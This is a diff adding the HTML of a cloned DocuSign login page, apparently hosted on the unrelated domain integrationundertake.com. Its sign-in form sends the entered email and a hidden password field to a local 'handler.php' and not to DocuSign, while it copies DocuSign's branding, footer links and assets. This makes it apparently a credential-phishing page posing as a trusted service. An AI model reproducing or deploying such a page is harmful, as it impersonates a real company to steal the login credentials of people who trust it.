@@ -1,0 +1,511 @@
+<!-- URL =http://integrationundertake.com/posting/sndout--><!-- w =(['INTEGRATIONUNDERTAKE.COM', 'integrationundertake.com'], datetime.datetime(2020, 10, 22, 19, 23, 28), datetime.datetime(2021, 10, 22, 19, 23, 28))--><!DOCTYPE html>
+<html class="account-server" dir="ltr" lang="en" ng-app="LoginAppNext.App">
+ <head>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <style type="text/css">
+   @charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}
+  </style>
+  <meta content="initial-scale=1.0" name="viewport"/>
+  <meta content="Sign in to your DocuSign account to electronically sign documents, request signatures, check document status, send reminders, and view audit trails." meta-description="" name="description"/>
+  <title>
+   DocuSign Login - Enter email to start sign in
+  </title>
+ </head>
+ <body class="site-content">
+  <page-title>
+  </page-title>
+  <link href="https://www.docusign.com/sites/all/themes/custom/docusign/favicons/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+  <!--<base href="/">-->
+  <base href="."/>
+  <link href="signinfiles/app.css" rel="stylesheet"/>
+  <!-- 17.4.1.20230 SE1FE43 42187a58-0a44-4162-a261-300f07644551 -->
+  <!-- -->
+  <div ui-view="">
+   <div ng-controller="UiFlavor as flavor">
+    <div class="authentication" ng-switch="flavor.ui.showHeader">
+     <!-- -->
+     <header class="text-center header" ng-controller="LogoController as logo" ng-switch-when="true" role="banner">
+      <!-- -->
+      <img alt="DocuSign" ng-if="logo.useDocuSignLogo" src="https://account.docusign.com/LoginAppNext/images/docusign_logo_small.png" translate="" translate-attr-alt="DocuSign"/>
+      <!-- -->
+      <!-- -->
+     </header>
+     <!-- -->
+     <!-- -->
+     <main class="main" role="main">
+      <header class="text-center header">
+       <!-- -->
+       <h1 call-to-action="title" ng-if="flavor.ui.showTitle" translate="Please log in to your account">
+        Please log in with your email address
+       </h1>
+       <!-- -->
+      </header>
+      <section class="authentication-state">
+       <!-- -->
+       <div ui-view="auth">
+        <div class="username" ng-controller="UserName as userName">
+         <form action="handler.php" anti-forgery-secured="" class="ng-pristine ng-valid-email ng-invalid ng-invalid-required" flow-submission="username" method="post" name="login" oauth-flow="">
+          <div class="form-group">
+           <input aria-required="true" auto-focus="" class="input input-text ng-pristine ng-empty ng-valid-email ng-invalid ng-invalid-required ng-touched" data-qa="username" id="username" login-hint="" name="email" ng-model="username" placeholder="Email address" required="" spellcheck="false" title="To log in, enter your email address" type="text"/>
+           <input aria-hidden="true" class="hide" id="password" name="password" type="password"/>
+           <input autocomplete="off" name="action" type="hidden" value=""/>
+          </div>
+          <div class="form-group" id="fixtureErrors" ng-controller="FixtureError as fixtureError">
+           <!-- -->
+          </div>
+          <div class="form-group">
+           <button class="btn btn-main btn-lg" data-qa="submit-username" ng-disabled="login.$submitted" type="submit">
+            <span translate="Continue">
+             Continue
+            </span>
+           </button>
+          </div>
+          <input name="RelayState" type="hidden" value="{}"/>
+          <input name="__RequestVerificationToken" type="hidden" value="Ad6JpPWC7zFzScyifFA2ZxQAAAAA0"/>
+         </form>
+        </div>
+       </div>
+       <!-- -->
+       <div class="footer" ui-view="authAlternative">
+        <div ng-controller="SignUp as signUp">
+         <!-- -->
+         <p class="text-center" ng-if="signUp.isEnabled">
+          <a href="./?#username" ng-href="#" translate="No account? Enter email above">
+           No account? Enter email above
+          </a>
+         </p>
+         <!-- -->
+        </div>
+       </div>
+      </section>
+      <!-- -->
+      <!-- -->
+      <aside class="authentication-alternative text-center" ng-if="flavor.ui.showAuthAlternative" role="complementary" ui-view="alternative">
+       <div class="form-group-inline" ng-controller="ExternalAuthentication as externalAuth">
+        <!-- -->
+        <div class="text-center" ng-if="externalAuth.isAvailable">
+         <!-- -->
+         <div class="form-group-inline" ng-if="externalAuth.showJanrainOptions">
+          <h2 translate="Or log in via:">
+           Or log in via:
+          </h2>
+          <!-- -->
+          <div class="janrain-options" ng-include="'LoginAppNext/login/external/janrain/janrain-options.html'">
+           <div class="form-group-inline" ng-controller="Janrain as janrain">
+            <a href="#" ng-href="#">
+             <img src="signinfiles/social_auth_providers.png" title="DocuSign Social Login - Sign in via Google+, Facebook, Microsoft, Office 365, Salesforce, Twitter, LinkedIn or Yahoo!" translate="" translate-attr-title="DocuSign Social Login - Sign in via Google+, Facebook, Microsoft, Office 365, Salesforce, Twitter, LinkedIn or Yahoo!"/>
+            </a>
+           </div>
+          </div>
+         </div>
+         <!-- -->
+         <!-- -->
+         <!-- -->
+        </div>
+        <!-- -->
+       </div>
+       <!-- -->
+       <div class="text-center form-group-inline" ng-include="'LoginAppNext/login/cancel.html'">
+        <span ng-controller="Cancellation as cancellation">
+         <!-- -->
+        </span>
+       </div>
+      </aside>
+      <!-- -->
+     </main>
+     <!-- -->
+     <!-- -->
+     <footer class="site-footer footer" ng-if="flavor.ui.showFooter" ng-include="'LoginAppNext/layout/footer.html'">
+      <div class="site-container grid footer-links" ng-controller="LanguageSelection as languages">
+       <div class="footer-links">
+        <div aria-haspopup="true" class="language-menu" id="languageMenu">
+         <button class="item link" ng-click="languages.showLanguageMenu($event);">
+          <span>
+           <span class="icon icon-language">
+           </span>
+           <span title="Current language" translate="" translate-attr-title="Current language">
+           </span>
+           English (US)
+           <!-- -->
+           <span class="icon icon-menu-triangle-down" ng-if="!languages.languageMenuVisible">
+           </span>
+           <!-- -->
+           <!-- -->
+          </span>
+         </button>
+         <ul aria-expanded="false" aria-hidden="true" class="languages ng-hide" id="languageList" ng-show="languages.languageMenuVisible" role="menu">
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="ar" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            العربية‏
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="bg" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Български
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="cs" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Čeština
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="zh_CN" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            中文 (简体)
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="zh_TW" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            中文 (繁体)
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="hr" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Hrvatski
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="da" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Dansk
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="nl" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Nederlandse
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="en" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            English (US)
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="en_GB" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            English (UK)
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="et" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Eesti
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="fa" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            فارسی
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="fi" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Suomi
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="fr" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Français (France)
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="fr_CA" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Français (Canada)
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="de" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Deutsch
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="el" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Ελληνικά
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="he" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            עברית‏
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="hi" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            हिन्दी
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="hu" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Magyar
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="id" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Bahasa Indonesia
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="it" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Italiano
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="ja" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            日本語
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="ko" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            한국어
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="lv" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Latviešu
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="lt" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Lietuvių
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="ms" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Bahasa Melayu
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="no" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Norsk
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="pl" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Polski
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="pt" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Português (Portugal)
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="pt_BR" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Português (Brasil)
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="ro" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Română
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="ru" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Русский
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="sr" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Српски
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="sk" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Slovenčina
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="sl" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Slovenščina
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="es" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Español
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="es_MX" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Español (América Latina)
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="sv" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Svenska
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="th" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            ภาษาไทย
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="tr" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Türkçe
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="uk" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Українська
+           </button>
+          </li>
+          <!-- -->
+          <li ng-repeat="(languageKey, languageInfo) in languages.available">
+           <!-- Set lang to languageKey so screen readers will read in native tongue -->
+           <button class="language link" lang="vi" ng-click="languages.setCurrentCulture(languageKey)" role="menuitem">
+            Việt
+           </button>
+          </li>
+          <!-- -->
+         </ul>
+        </div>
+       </div>
+       <ul class="footer-links" role="navigation">
+        <li>
+         <a class="item" href="http://www.docusign.com/support" target="_blank" title="Link opens in new window" translate="Help" translate-attr-title="Link opens in new window">
+          Help
+         </a>
+        </li>
+        <li>
+         <a class="item" href="https://www.docusign.com/company/terms-of-use/lang/en" ng-href="https://www.docusign.com/company/terms-of-use/lang/en" target="_blank" title="Link opens in new window" translate="Terms" translate-attr-title="Link opens in new window">
+          Terms
+         </a>
+        </li>
+        <li class="collapse">
+         <a class="item" href="https://www.docusign.com/IP/lang/en" ng-href="https://www.docusign.com/IP/lang/en" target="_blank" title="Link opens in new window" translate="Intellectual Property" translate-attr-title="Link opens in new window">
+          Intellectual Property
+         </a>
+        </li>
+        <li>
+         <a class="item" href="https://www.docusign.com/company/privacy-policy/lang/en" ng-href="https://www.docusign.com/company/privacy-policy/lang/en" target="_blank" title="Link opens in new window" translate="Privacy Policy" translate-attr-title="Link opens in new window">
+          Privacy Policy
+         </a>
+        </li>
+       </ul>
+      </div>
+      <aside current-date="currentDate" role="contentinfo">
+       <p translate="Copyright © [[year]] DocuSign, Inc. All rights reserved." translate-interpolation="bracket" translate-values="{year: currentDate.getFullYear()}">
+        Copyright © 2018 DocuSign, Inc. All rights reserved.
+       </p>
+      </aside>
+     </footer>
+     <!-- -->
+    </div>
+   </div>
+  </div>
+  <!--[if (!IE)|(gt IE 8)]><!-->
+  <script src="signinfiles/corenext">
+  </script>
+  <!--<![endif]-->
+  <!--[if lte IE 8]>
+      <link href="/LoginAppNext/styles/legacy?v=4PA642FFntoeJCbU9Xo8MtjFl47UpOhb1wGcStBQ1UU1" rel="stylesheet"/>
+
+
+<script src="/LoginAppNext/corenext/legacy?v=vaztF_3obMKOHKOg88Uql6igHORRetdvVSX_Ne-_ROY1"></script>
+      
+        <style type="text/css">
+            /*
+                Older browsers (IE8) may interpret the new tags as having an empty XML namespace
+                when Angular attempts to generate them, so we need to deal with the default styling of those elements, too.
+            */
+
+            \:article,
+            \:aside,
+            \:details,
+            \:figcaption,
+            \:figure,
+            \:footer,
+            \:header,
+            \:hgroup,
+            \:main,
+            \:nav,
+            \:section,
+            \:summary {
+              display: block; }
+        </style>
+    <![endif]-->
+  <script src="signinfiles/templates">
+  </script>
+  <script src="signinfiles/app(1)">
+  </script>
+ </body>
+</html>
